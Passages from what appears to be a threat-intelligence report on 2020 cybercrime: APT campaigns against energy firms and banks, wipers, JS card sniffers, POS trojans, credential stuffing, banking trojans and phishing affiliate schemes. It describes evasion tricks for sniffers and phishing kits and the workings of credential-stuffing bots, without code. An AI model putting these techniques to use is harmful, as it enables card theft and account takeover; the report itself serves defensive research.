MESSAGETAP is a 64-bit ELF data miner initially loaded by an installation script. Once installed, the malware checks for two files: keyword_parm.txt and parm.txt, which contain instructions for MESSAGETAP to target and save SMS message content. Both files are deleted from the disk once the configuration files are read and loaded into the memory. After loading the keyword

and phone data files, MESSAGETAP begins monitoring all network connections to and from the server. It uses the libpcap library to listen to all traffic and extracts SMS message metadata, including SMS message content, IMSI numbers, and source and destination phone numbers."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|9b2bab9222cd41688dad93d32e52c033
"Based on the above information, users and organizations must consider the risk of unencrypted data being intercepted several layers upstream in their cellular communication chain. This is especially critical for frequently targeted individuals such as dissidents, journalists, and officials who handle highly sensitive information.

Growing power of DDoS attacks An increase in the number of Internet of Things (IoT) devices has led to more and more hosts being added to infamous botnets such as Mirai. In addition, new botnets have emerged. As regards DDoS attack techniques, SYN floods still remain the most common type of attack. ICMP flood attacks rose from last to second place in popularity, and HTTP floods finished in last place — they have become less widespread since January 2019. In 2020, denial-of-service attacks became more effective. In the first half of 2020, threat actors set new records for DDoS attack power.

Largest Gbps DDoS attack ever recorded According to Amazon's Q1 2020 threat report, its AWS Shield service mitigated the largest DDoS attack ever recorded, stopping a 2.3 Tbps attack in mid-February this year. The company did not disclose the attack’s target or origin. The attack was carried out using hijacked CLDAP web servers and lasted three days. CLDAP (Connectionless Lightweight Directory Access Protocol) is an alternative to the older LDAP protocol that has been abused for DDoS attacks since 2016. CLDAP servers are known to amplify DDoS traffic

by 56 to 70 times its initial size, making it a highly sought-after protocol and a common option provided by DDoSfor-hire services. The previous record for the largest DDoS attack ever recorded was 1.7 Tbps. It was mitigated by NETSCOUT Arbor in March 2018. The attack abused Memcached servers exposed to the Internet and reached massive bandwidths.

After the device was compromised through a vulnerable driver, the wiper spread to other devices in the network for further destructive attacks. The malware then overwrote the master boot record (MBR) and disk partitions on Windows-based machines using a legitimate driver, EldoS RawDisk. While Group-IB researchers could not determine the exact number of organizations that were impacted, at least 1,400 hosts were affected by ZeroCleare.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|c2fe8eb5f0374e2a8b6f81c85fe8b335
The Chinese-backed hacker group APT20 attacked companies in ten countries as part of a campaign called Operation Wocao. The group’s attacks affected various industries, including the energy sector. The hackers compromised target networks via vulnerable web servers managed by a company or government entity. The threat actor then propagated across the network looking for system administrator credentials with privileged access to the infrastructure's most critical parts. APT20 installed keyloggers on computers used by administrators in order to capture keystrokes and steal passwords. The campaign involved tools such as web shells for file upload and command execution, a script for scanning the system for information, the custom XServer backdoor, CheckAdmin to identify if administrators are logged in, and others. APT28 The group APT28 is believed to have been behind a phishing attack against the Ukrainian oil and gas group company Burisma in early November 2019. The threat actors registered lookalike domains that mimicked legitimate websites belonging to Burisma’s subsidiaries and partners. In particular, domains targeting the following subsidiaries were discovered: KUB-Gas LLC, EskoPivnich, and CUB Energy Inc. To carry out the attack, the threat actors sent employees emails with links to login pages. The links looked legitimate. In addition, the attackers set up sender authentication records using SPF and DKIM.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|5928666b7f574e71af6219b8e0d645d6
After victims followed the link and entered their credentials, the attackers gained access to them and could use them to further the attack. Some employees entered their credentials on the fake webpages, which allowed the threat actors to stealthily operate within the organization and obtain the information they needed. APT41 The group APT41 used a new ransomware family called ColdLock to conduct a series of attacks against several organizations in Taiwan. Analysis of the malware revealed similarities between ColdLock and the previously known Freezing ransomware family as well as the EDA2 “educational” ransomware kit. For example, Freezing and ColdLock have a similar method of propagating within networks (compromised AD servers), similar reflective injection methods, and a similar internal module architecture. ColdLock terminates the following services on the system before encrypting their files: group-ib.com|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|57647c6f2a524dd891eca4c89f1ee005
According to media reports, the campaign struck the computer systems of Taiwan’s state-owned energy company, CPC Corp., which delivers oil products throughout Taiwan. Although the attack did not affect the company’s energy production, it did reportedly prevent some customers from using CPC Corp.’s payment cards to purchase gas. PoetRAT A new remote access Trojan named PoetRAT was discovered in February 2020. The attacks affected Azerbaijan’s government agencies and industrial companies, mainly in the energy sector. The investigation revealed that cybercriminals are particularly interested in SCADA systems used in the electricity sector, specifically in wind turbine systems. RAT is written in Python and has all the features specific to this type of malware. It gives the operators complete control over the compromised system. The attackers sent malicious Microsoft Word documents, some of which were made to look like messages from Azerbaijani government agencies or from the Defense Research and Development Organization of India. Some of the file names mentioned COVID-19. The threat actors monitored specific directories, which meant that they wanted to exfiltrate specific information about the victims. The attackers likely wanted to get a full picture of the victims by using keyloggers, browser credential stealers, and Mimikatz and pypykatz for further credential harvesting.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|cf8f093bef4a40369ca707977b5aa99e
OilRig Iranian hackers were once again found to be using wipers, but this time the attacks are attributed to the OilRig group (aka APT34). A new Trojan called ZeroCleare was used in a recently discovered targeted attack on an oil and gas company. The attack most likely started in the fall of 2018 with reconnaissance scanning from various low-cost/free VPN providers and gaining access to one of the accounts that was later involved in the|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|face04f9a378444299f9df761e57d348
Later, a new strain of ZeroCleare data-wiping malware called Dustman was detected on the network belonging to Bapco, Bahrain's national oil company. A common component of the malware is EldoS RawDisk. Dustman differs from other wipers by the fact that the necessary drivers and loaders are supplied in one executable file and not two, as is the case with ZeroCleare. Dustman also overwrites the volume, while ZeroCleare erases it by overwriting it with junk data (0x55). In this case, however, OilRig was most likely trying to cover its tracks as the hackers had previously made mistakes that revealed their presence on the network. Orangeworm Since January 2020, a wave of attacks involving the Kwampirs Trojan has been identified. The malware has been linked to the Orangeworm group, which used the Trojan to attack companies in the healthcare sector, in particular software supply chain companies. After penetrating the system, Kwampirs collects basic data about the device and sends it to a remote server. Attackers then gain access to sensitive data using the backdoor on the infected machine. If the compromised system is identified as potentially interesting, the data is stolen and the malware is copied to all available machines and network resources. This year, the threat actor has been conducting supply-chain attacks against software vendors, but the group's ultimate interest has changed.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|c3d2604d214b4b38b46f03fd1b4c077f
"They now attempt to gain access to organizations that support industrial control systems (ICS) for the global production, transmission, and distribution of energy. Orangeworm is not officially associated with any country. The FBI has said, however, that the Kwampirs source code shows that the Trojan is similar to the infamous Shamoon wiper developed by the Iranian hacker APT33, though the latter does not have a wiper component. page 47 of 78

USBCulprit

USBCulprit is delivered using another Trojan (NewCore RAT), which initially reaches users via spear phishing emails, usually politically themed. Once it is in the system, USBCulprit scans paths to executable files, collects documents with certain extensions, and exports them to USB drives connected to the system. When a USB drive infected with USBCulprit is connected to a computer, the Trojan will copy stolen files either to or from the removable drive.

USBWorm component

of the Crimson Trojan

USBWorm is a component developed for stealing files from removable drives and spreading malware across systems by infecting removable media. To steal data, the malware enumerates all the files stored on the device and copies those with an extension matching a predefined list. As part of the infection process, the malware lists all directories. Then, for each directory, it creates a copy of itself in the drive root directory using the same directory name and changing the directory attribute to “hidden”. This results in all the actual directories being hidden and replaced with a copy of the malware using the same directory name. Moreover, USBWorm uses an icon that mimics a Windows directory, tricking the user into executing the malware when trying to access a directory.

→ Threats to the telecommunications sector

Analysis of these attacks reveals that threat actors usually apply the following techniques to attack the energy sector:

Attack vector

Modus operandi

Reconnaissance via OPC

Attackers use the OPC protocol to gather information about the equipment being used and to identify its topology.

Access to SCADA HMI"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|934f9a6b3d57427899f734e1137886fa
"Attackers use the OPC protocol to gather information about the equipment being used and to identify its topology.

Access to SCADA HMI

Since HMI workstations have a small attack surface, in addition to standard methods of gaining access to computers running Windows, hackers actively investigate vulnerabilities in the HMI. Exploiting such vulnerabilities means that malicious code can be executed.

Controller management

Attack frameworks (e.g., Idustroyer) are being supplemented with modules that allow threat actors to manage controllers using standard protocols such as IEC 60870-5-101, IEC 60870-5-104, and IEC 61850.

Control over emergency

shutdown systems

Control over emergency shutdown systems allows hackers to stop production, so attackers have developed specialized modules for this purpose (e.g., the Triton framework).

Infiltration through home

routers and NAS

In order to detect industrial networks, the threat actors load modules for traffic analysis and Modbus protocol detection (e.g., the VPNFilter framework) on network devices.

Organized crime targeting the energy sector Crime groups conduct two main types of attack on the energy sector: — Active sale of access, including to networks belonging to energy companies

— Ransomware attacks Many types of ransomware have been equipped with new capabilities to detect processes associated with industrial control systems. This has caused"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|12f8a2a4345e4416977c02e5e2c7a337
"substantial losses of critical data and higher ransom amounts for recovering access to such data. This is especially true for data stored on Historian servers.

Sale of access In 2019, cybercriminals stopped publish full company names very often, making it more difficult to categorize a compromised company. Based on the descriptions presented, six companies in the energy sector were identified. Five

of them are associated with the extraction of energy resources. In 2020, Group-IB did not observe an increase in the sale of access to networks belonging to energy companies. This year, access to seven companies

was offered for sale. Two companies are involved with energy directly and five are associated with production. The only company whose name has been published is Entrust Energy.

The era of targeted attacks on banks to steal funds is over. Last year's report covered five active groups: Cobalt, MoneyTaker, Silence, SilentCards, and Lazarus, all of which successfully committed thefts through SWIFT, ATM Switch, card processing, and ATMs. In 2020, such thefts have almost stopped.

HI

TECH CRIME TRENDS 2020/2021

Recent thefts SWIFT Only Lazarus and Cobalt stole via SWIFT. The most recent public incident occurred in February 2019 at the Bank of Valletta in Malta. The most interesting events always remain behind the scenes, however, and attempts to commit theft have not

stopped entirely. Over the past year, Group-IB researchers detected incidents in several countries (Argentina, India, Kenya, Ghana, and Jordan) per quarter, but not all attempts were successful. Two groups were active during this period: NanoSwift and Lazarus.

NanoSwift At least one known incident involving this group took place. Compromise was initially achieved using a legitimate remote access tool called RMS, which was installed using a VBS script:

"This script has been “in the wild” for a long time and was first uploaded to VirusTotal on October 8, 2018.

For further propagation, the attackers used the well-known NanoCore Trojan, which was saved on the system as lanss.exe in the \LAN Subsystem\ lanss.exe directory, which is a typical NanoCore indicator known since 2018.

The following tools were used to escalate privileges:

Evidence suggests that the threat actor uses quite an old toolset. It is effective only if the hackers attack a bank with a minimum level of security and set “traps” for the incident response teams.

Lazarus

What is notable, however, is the use of CVE-2020-0796, which was made public in March 2020, and the first exploit was made available in the same month. A file named cve-2020-0796-local.zip was published on GitHub on April 3. This indicates that the incident took place between April and July 2020."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|17c562c1d8134ee3adffac96049b40cd
"Lazarus mainly attacks small banks because they are an easy target. In 2020, it transpired that the group purchases pay-per-install services from operators of the TrickBot botnet. This explains why, in the case of several incidents, it was noted that the TrickBot Trojan loaded into the memory malicious code developed by Lazarus, which was downloaded from external servers. The incidents involved two domains used by Lazarus from which malicious code was downloaded:

Based on the dates when the domains were registered, the organizations were compromised in April 2019 and January 2020, but the thefts were attempted one to two months later.

The Philippine government-controlled United Coconut Planters Bank (UCPB) was robbed in September 2020. The reports mentioned that the attackers increased the ATM withdrawal limit from 20,000 pesos to 10 million pesos per day.

They also gained access to InstaPay, an interbank transfer system. As a result, they siphoned 167 million pesos (USD 3.44 million) from the bank. Following the investigation, four Nigerian citizens were arrested.

ATM Switch The only group that leveraged ATM Switch access during the reporting period is Lazarus. In August 2020, US-CERT issued a security alert that

this group had resumed its activity and that they had malicious code in their arsenal that could be used to steal funds through an ATM Switch running

Windows. In the past, this code was used only to attack AIX operating system versions. Despite the alert, the most recent theft was detected in 2018.

ATM Many groups (Cobalt, MoneyTaker, Silence, Lazarus) possess ATM Trojans, but they don't actively use these tools.

It is important to note that the functionality for working with ATMs has been borrowed from xfs-disp.exe, which we described in our report on Silence. The XDA.RAT source code is therefore based on two projects: dnscat2 and xfs-disp.exe.

In September 2019, Group-IB researchers described a Trojan called Dtrack used by Lazarus, which was discovered back in 2018. Since then, it has not been used for theft purposes.

When the Trojan receives the 9 command, it collects information in the same way as xfs-disp.exe:"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|43581118e96b410a8c100caef4fd6fad
"When the Trojan receives the 9 command, it collects information in the same way as xfs-disp.exe:

In the second half of 2019, Silence was the only group to carry out attacks on banks. They successfully infiltrated several banks in Chile, Costa Rica, and Bulgaria, but their attacks were thwarted at early stages. In November 2019, two files were uploaded to VirusTotal from the Republic of Senegal: xfs.dll and dns.dll. The xfs.dll file was compiled on October 19, 2019. It is likely that the ATM attack was carried out on this day, and this is evidence of the last such successful attack conducted by Silence. At the time, the main Trojan used by Silence was XDA.RAT. The XDA.RAT source code is based on an open-source project: https:// github.com/iagox86/dnscat2. The application supports the following commands: — 0: ping command — 1: create a cmd.exe process — 2: execute a shell command — 3: download a file — 4: upload a file from the infected device to the C&C server — 5: close all connections — 6: change the interval of making requests to the server — 7: save the %LOCALAPPDATA%\ updatea.bin file — 8: overwrite the <%XDA_path%>\ updatea2.bin file — 9: get information about the connected dispenser — 10: carry out an ATM jackpotting attack

Shift in priorities The main challenge that threat actors face when attacking banks is not how to gain access to the target system, but how to eventually withdraw and launder the stolen funds. If attackers find an opportunity to make the same amount of money while attracting less attention from law enforcement agencies with a higher chance of success, they shift their focus. This is what

happened with Cobalt and Silence. We still come across the unique malicious codes used by Cobalt and Silence, but no related thefts have been detected. Presumably Cobalt or some of its members have joined the private Thanos ransomware affiliate program. This fact is confirmed by the use of a unique

packer for Thanos ransomware. The same packer was used by Cobalt for their unique CobInt Trojan. Silence did not end their activity in 2020, either. Group-IB discovered new C&C servers used in attacks against atypical targets: medical and industrial companies in Western Europe.

This is because the use of JavaScript sniffers to steal bank cards has become one of the main techniques of obtaining large volumes of payment information. The increase in attacks was also caused by the trend of reselling access to various websites and organizations on underground forums. The most popular JS sniffer families The number of known JS sniffer families has grown from 38 to 96 compared to the previous year. Each of the new families deserves to be analyzed separately. According to Group-IB's findings, over the past year nearly 460,000 bank cards compromised using JS sniffers. Additionally, 645,000 bank cards were put up for sale at card shops for a total of $3.6 million. The top nine banks that issued the stolen cards are located in the US, with 170,000 cards in total. Cybercriminals are also interested in cards issued in Brazil, Australia, Canada, Spain, the United Kingdom, India, Singapore, and France. Lazarus, JS sniffers, and Bitcoin theft In July 2020, security researchers reported that the state-sponsored APT group Lazarus used JS sniffers to steal credit card data from 25 online stores worldwide. Group-IB researchers identified two campaigns that involved infrastructure previously seen in attacks attributed to the North Korean group. The first campaign began in May 2019. The attackers used the ClientToken sniffer family to infect 20 online stores.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|2e6ac896a76b4d32b465005f2347fe39
"The second campaign began in February or March 2020 and targeted large online stores. In total, three websites were infected with the Preloader sniffer. Group-IB found two websites that the attackers used to collect cards stolen during the Preloader campaign, which may indicate a greater number of victims. Group-IB researchers also discovered the BTC Changer campaign, during which a modified version of ClientToken was used to spoof the address of a Bitcoin wallet at the time of payment on online stores that accept Bitcoin. Specialists found two websites infected during this campaign, which brought the attackers 0.66983720 BTC (approximately $7,800). Sale of access to online stores Access to hacked online stores — for the purpose of subsequently deploying a sniffer — can be purchased on underground forums. The price heavily depends on the country in which the store operates, the number of buyers per day, and the type of payment system group-ib.com

used on the website. If payment is made in a separate window opened in an iframe or after being redirected to the payment system website, then it is more difficult to deploy a sniffer. Such lots will therefore be cheaper than websites on which card data is entered on the website itself. To gain access to a store or install a JS sniffer, cybercriminals continue to use known vulnerabilities in popular e-commerce CMS. They also employ malicious software to steal passwords and conduct brute-force attacks on administrative control panels of stores or DBMS. For example, threat actors continue to conduct attacks using the GoBrut malware written in GoLang. The program is used to conduct distributed brute-force attacks on online stores and administrative panels of popular CMS such as Magento, OpenCart, phpMyAdmin, and cPanel. Subsequently, the threat actors leverage access to administrative panels and administration tools to install JS sniffers on the target websites. Evasion techniques To prevent malicious code from being detected and removed from the victim website, cybercriminals use several techniques. — Most techniques are based on using JavaScript to load the main JS sniffer code when the user is on the checkout page. In the past, JS sniffers were often loaded from a link using the script tag. — Another increasingly popular technique involves concealing the JS sniffer code within an image."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|687d4bd3ae70465594d796d521a3f5f3
The injector code downloads the image from the attackers' server, extracts the JS sniffer code, and executes it on the online store page. — Criminals still use the code for detecting whether a browser's console is open to avoid being detected|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|994094c0360747538c4771f65b71f2dc
by researchers and security tools. The malicious code will not be run and will not execute the main load if it detects that the browser's developer console is open on the visitor's website. — To avoid detection, JS sniffer families also use several different checks under the responsibility of the server-side sniffer: the main JS sniffer code will be obtained only if (i) the user's IP address does not belong to the network of a large cloud provider, (ii) the user's country (determined by IP address) corresponds to the country of the store, and (iii) the Referer field contains the address of the infected store's payment page. If at least one of these checks fails, a benign JS script of a legitimate library is returned in response to a sniffer code request. — Loading the main sniffer code using JavaScript helps attackers conceal the address from which the code is loaded. The simplest code samples use Base64 to hide links to malicious JS files. However, we often find samples of malicious code in which the link to the JS sniffer is stored in encrypted form and as a concatenation of parts of a URL address or a string with a reverse character order. — Group-IB Researchers also found samples of malicious code that used the Domain Generation Algorithm (DGA) to obtain the website address from which the main sniffer code will be downloaded. The actual address depended on the exact date that the attackers created one domain for each month.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|7ec933c453a44448aa27551c82c463a7
"If one of the domains was blocked, all they had to do was wait and the flow of bank card data from the infected store would resume.

Attacks on POS terminals The main product sold by carders is bank card dumps. In total, 63.7 million dumps were found for sale during the reporting period, which is 156% more than last year. The main method of compromising magnetic stripe data is infecting computers with connected POS terminals with special Trojans that collect data from RAM. In total, 14 Trojans were found to be active during the reporting period:

— RtPOS

— TinyPOS

— UdPOS

— FighterPOS

— DiamondFox

— GratefulPOS

— FrameworkPOS

— MajikPOS

— DMSniff

— PinkKite

— BADHATCH

— Pillowmint

— GlitchPOS

— Alina POS

During the reporting period, Group-IB researchers established that 19 retail chains were compromised, as a result of which millions of bank cards were put up for sale.

Credential stuffing One of the most common security issues is the credential stuffing technique, i.e. extracting login-password pairs from various leaks (email, phone number, and other identification data can be the login) for subsequent bruteforce attacks.

The problem is that many users choose the same passwords for different resources, and if one resource becomes compromised, the same login credentials could be used on others. It is also worth noting that currently almost all major leaks are initially put up for

sale, then become publicly available on underground forums, which makes it easy for attackers to collect databases for credential stuffing attacks. This applies to all retailers with personal accounts on online resources, but also to some bank accounts and e-wallets.

"from the retailer. In some cases, cybercriminals sell access to such accounts.

— A common method of monetizing reward points is by purchasing goods that can later be resold. Criminals purchase gift cards for stores that sell digital content (e.g., PlayStation Store, Xbox Store), then resell the cards or use them to pay in-store. — If attackers gain access to many user accounts, they can group reward points together and pay for a large number of purchases and/or buy more expensive goods. — In some retail chains, bonus points can be used to pay at checkout in-store. In such cases, cybercriminals use virtual loyalty cards, barcodes, and discount coupons from the user's personal account to cash in bonus points and pay for purchases.

"Retailers offer users rewards and gifts for upgrading to a higher level of service or a more expensive tariff.

Types of monetization Gaining access to bank accounts and e-wallets Bank accounts and e-wallets are among the most obvious targets for cybercriminals. Hackers prefer attacking online resources that give direct access to the victim's money. Some banks provide access to online banking using the pair email:password or phone:password, which makes them attractive targets. It is difficult for cybercriminals to directly withdraw funds from banks because such operations usually require confirmation (two-factor authentication) from the account holder. This explains why this monetization method is not the most popular one. That being said, e-wallets do not usually involve such sophisticated security measures as those deployed to protect bank accounts. After gaining access to the electronic wallet, attackers attempt to either make purchases at the victim’s expense or transfer the funds to another wallet, registered to a money mule, through various exchange services. Monetizing reward points Online and offline retailers often offer members of their loyalty programs cashback for purchases in the form of reward points or money. Reward

"Receiving gift points or goods

Attackers can take advantage of access to a user's account and independently transfer it to another level of service in order to receive a reward. The threat actor will then sell the reward. Access to personal data In the user's personal account on the retailer's website, attackers can gain access to the following personal data: — full name — contact information (phone number, email, delivery addresses) — data about payment methods (bank card and/or account numbers, accounts in payment systems) If personal user data in the retailer's accounts is poorly protected, attackers can exfiltrate it for subsequent social engineering attacks or to be sold to other interested parties.

Attack techniques To carry out such actions, threat actors need: — login-password lists from various leaks — lists of proxy servers to bypass blocking due to a limited number of requests allowed from one IP address — a program that will receive as input the lists of logins, proxies, and the address of the resource to check the existence of a user with such login and password details Tools used to carry out the above attacks are of the greatest interest to threat hunters. They can be divided into three main categories: — bots without browsers — browser bots — hybrid solutions Bots without browsers This is the most primitive way to implement such tools. Bots without browsers are extremely simple, they work reliably and quickly, but they cannot bypass anti-bot solutions. There are many different offers of ready-made tools on the market, but one of the most widespread is OpenBullet, an open source tool. Its main advantage is extensibility. Threat actors must usually adapt the code for each online resource, which needs

to be checked for certain user accounts. In OpenBullet, as in many other tools, the code is adapted in configuration files. This means that many users write configuration files for different resources, and the largest of them have long been on the list. A distinctive feature of paid resources is a more comprehensive offer. Developers of paid tools constantly update proxy lists and write log parsers to extract contact and payment information from personal accounts. Since it is easy to conduct attacks using bots without browsers, some scammers prefer to write their own scripts to perform attacks against specific resources. Hybrid solutions Since bots without browsers cannot pass CAPTCHAs and receive cookies, scammers have developed a hybrid solution. Criminals launch the browser either automatically or manually and receive cookies. The cookies are then added to the bot configuration file, after which the bots check login and password details (without the need to launch a browser). This scheme is easy to implement and, most importantly, it works quickly and does not require many computing resources."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|b5afe2e3f3114c09b4a18950227015c9
"that solve the simple types or SaaS services for their solution. In the latter case, scammers automatically send the link to the service via the API and receive a cookie or a solution in response. Hybrid methods can bypass almost all anti-bot solutions. Browser bots It is rare to find resources with reliable protection. More often than not, these are large social media or IT giants that use their own solutions to protect against bots. In such cases, scammers write unique browser bots for each resource. Browser bots are full-fledged browsers that automatically start, open pages, run scripts, and emulate user behavior on a website. This variant is much more expensive than the previous ones. It requires a great deal of customization, while running many browsers requires more server power and, most importantly, is much slower.

Trojans for PC A total of 19 PC banking Trojans were active this year, 12 of which were written by Russian-speaking developers. Six Trojans were developed by Latin American authors. Russian-speaking owners of the largest banking botnets have also followed the main trend of switching to using ransomware. For example: — Trickbot uses the following ransomware: Ryuk (later Conti), Kraken, Thanos — Dridex uses WastedLocker, DoppelPaymer; it previously used BitPaymer, Locky, Bart, and Jaff — Qbot (Quakbot) started using ProLock — zLoader/Silent Night also switched to using an unidentified ransomware — RTM, which is the only banking botnet active in Russia, uses Cerber A shift in focus does not mean that threat actors stop committing thefts. If they see an opportunity to transfer a large amount of money, they will take it. But as a general rule, their main income now comes from ransomware. This change in behavior has led to less damage from theft and changed the money laundering market. Given that the most widespread banking Trojans used to be developed by Russian-speaking cybercriminals, the decrease in thefts has led to this segment degrading more significantly.

During the analyzed period, only one new banking Trojan developed by Russian-speaking authors appeared: Silent Night. It is an improved version of the old Axebot Trojan and was used in attacks on German Internet users. During the same period, another three Trojans created earlier by Russianspeaking authors stopped being used completely: TinyNuke, Panda Banker, and Osiris. Russia The only banking Trojan for PCs in Russia is RTM, which does not seem to be used much and will likely soon cease to exist. This banking botnet uses Cerber ransomware. Latin America Latin America has become the main source of banking Trojans. In 2020, five new Trojans emerged: Guildma (Astaroth), Grandoreiro, Javali, Melcoz, and Metamorfo. All have been active for several years, but attracted the attention of researchers only recently."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|fb4840b386c1498087a7f3d23c7c4d47
The developers of these Trojans live in Latin America and their Trojans are used locally, although some of them are starting to attack Europe and the United States. USA and Canada Traditionally, the US and Canada have been the primary targets for banking Trojans. Even Latin American developers have added American banks to their config files. Currently, eleven Trojans for PCs pose a threat to clients of US and Canadian banks, ten of which were developed by Russian-speaking hackers: Metamorfo, zLoader/Silent Night, Gootkit, Trickbot, Gozi, IcedID, Danabot, Ramnit, Dridex, LokiPWS, and Qbot. APAC In the APAC region, banking Trojans have barely undergone any significant changes. The key targets are Japan and Australia, which are attacked using wellknown Trojans: Trickbot, Gozi, Danabot, Ramnit.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|a27004d83a2b4c7bbdf5e2fefc93b080
"Trojans for Android The Android Trojan market is similar to the PC Trojan market. The main developers are Russian-speaking hackers. However, developers from Latin America are actively expanding to the market and use their tools to attack bank customers locally. In total, ten Android banking Trojans were active this year, five of which are brand new. An author of the Red Alert banking Trojan with the nickname Sochi stopped developing Trojans and switched to working with JS sniffers. Authors of Android Trojans are not picky about names. For instance, Alien Bot appeared in 2020, but Trojans with the same name but from other developers had existed before. Android Trojans mainly use web fakes, i.e. dialog boxes that request the information required (passwords, bank card numbers, etc.) from the victim. Services offering to develop such web fakes appeared in the Russian-speaking underground segment. As a result, banking Trojan authors no longer need

It is enough to buy a set of web fakes and the Trojan can be used in almost any region, which is what usually happens with Trojans created by Russianspeaking cybercriminals. Russia Only two Android Trojans were active in Russia: Flexnet and Anubis. They did not cause significant damage. For example, Flexnet spread more massively and was able to infect 50,000 devices and intercept data from just over 5,000 bank cards. Anubis spread more selectively, using landing pages disguised a Russian bank brand, and infected about 400 clients in a targeted way.

Latin America The locally developed BasBanke Trojan was most active in Latin America. BasBanke works as part of an affiliate scheme, i.e. several people can distribute it at once. USA and Canada Russian-speaking authors adhere to the unspoken rule that Android Trojans should not be used to attack US clients, although the authors of web fakes are actively creating windows to collect data from US financial institutions. Only two Trojans pose a threat: the new Alien Bot and BlackRock.

from home. Scammers quickly adapted to this trend and began carrying out phishing attacks on services and individual brands, which previously did not have much financial appeal to them. — Change of tactics. In previous years, attackers ended their campaigns after fraudulent websites were taken down and quickly switched to other brands. Today, they are automating their attacks instead and replacing the blocked pages with new ones.

This significant growth can be explained by two main factors: — The pandemic. During lockdowns, many attackers had more time to devote to malicious activity. In addition, phishing, as one of the simplest earning schemes, attracted the attention of a larger audience as many people lost their income due to the pandemic. — On the other hand, lockdowns increased the demand for online shopping. More and more people began to order goods and services

"than 20% during the reporting period. Postal services and financial institutions also remained a key target for attackers. Another attack type that increased significantly was phishing used to collect accounts for various online services such as Microsoft, Netflix, Amazon, eBay, and Valve Steam. Phishing resources targeting cryptocurrency projects have disappeared almost completely. The main reason lies in the waning interest in ICO projects, which were a key target for phishers in 2017 and 2018.

Phishing evasion techniques

Affiliate programs

So far, the main 2020 trend is the use of one-time unique links that become inactive after the user opens them. This means that if someone clicks on the link at least once, it will not be possible to obtain the same content again in order to collect evidence. This significantly complicates the process of taking down phishing resources."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|6fe8c1934d0947788ca07a879efbc948
"Phishing scammers cannot do much damage on their own. As such, there are affiliate programs that bring together people who want to make money by phishing.

Common evasion techniques used by phishers are listed below: — One-time links. A unique one-time link is generated for each user. — Blocking by subnets. The subnets of many companies that provide phishing page detection services are blacklisted, and if a request for a page comes from their subnets, phishing content will not be shown. — Blocking by user agent. Attackers understand who their target audience is, and if it is clear from the user agent that this is not a real user, phishing content will not be shown. For example, if a criminal carries out an attack on mobile device users, all visitors with a PC browser will not receive the phishing page. Phishing kit scripts usually contain a list of keywords that are checked in the user agent field. — Blocking by region. GeoIP databases are actively used by various criminals and phishing is no exception. If the target audience is located in Singapore, there is no point in showing the phishing page to users in the United States. — Redirects to official websites. If some checks are failed, instead of phishing content visitors will be redirected to the attacked brand’s official website or to websites belonging to other legal services.

In Russia, the main reason for the significantly higher numbers of phishing attacks is the emergence of various affiliate programs for hackers wanting to make money off phishing involving fake bank rewards programs, lottery draws, paid surveys, and more. At the final stage of the scam, the victim is prompted to enter their payment details or make a transfer. The affiliates distribute links to as many people as possible. Affiliate program organizers create landing pages, accept payments, and help launder money. For example, in a short period of time, one of the affiliate programs created more than 12,000 accounts of money mules to transfer stolen money. So far, this trend has been observed only in Russia. Russia is often used as a testing ground, so similar schemes are likely to appear in other countries. Automated management of phishing projects Since the start of the year, there has been a rise in advanced social engineering, namely when multi-stage scenarios are used in a phishing attack. As part of such increasingly popular phishing schemes, threat actors first stake out the victim: they establish contact with the target individual (e.g., through a messenger), create an atmosphere of trust, and only then do they direct the victim to a phishing page."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|967bc65dee424723953689b68007d17f
"stolen funds through dedicated Telegram channels and bots. A typical infrastructure for such a project built around Telegram might include the following features: — a bot for recruiting, where information about a new potential cybergroup member is entered (scamming experience, age, link to a profile on the forum, etc.) — a bot for displaying information about successful thefts (nickname in Telegram, how much money was made and how) — private channels for interaction/communication/support for members of the scam group — bots for generating phishing links based on certain settings, which are introduced by group members during attacks In addition to the traditional phishing kits, underground hacker forums nowadays offer ready-made management platforms designed to automate phishing projects. Thanks to such platforms distributed as SaaS, the number of groups that can be easily scaled is growing. The number of members in a group built around such platforms can reach several dozen people. Automating management of a criminal group in turn leads to the emergence and spread of more complex social engineering. The latter is slowly starting to be used in large-scale attacks and not only in targeted attacks as before.

Communications between members of such new criminal gangs are especially interesting. Hackers coordinate attacks, communicate, and distribute

Three pillars of information security Technologies Nowadays, threat actors are continuously innovating. Criminals implement new tools with more enthusiasm and much faster than many companies. This is what affects the balance of power on the information security battlefield. Take advantage of the latest developments and solution classes available on the market to prevent your opponent from gaining the upper hand. Team

IS*

